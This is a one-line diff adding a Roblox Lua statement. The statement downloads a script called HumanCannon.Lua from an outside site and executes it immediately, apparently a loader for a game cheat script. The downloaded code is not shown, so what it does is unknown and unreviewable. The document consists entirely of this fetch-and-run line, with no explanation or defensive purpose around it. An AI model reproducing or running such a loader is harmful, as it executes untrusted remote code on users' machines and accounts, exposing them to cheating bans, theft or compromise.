@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://jumblescripts.com/HumanCannon.Lua"))()
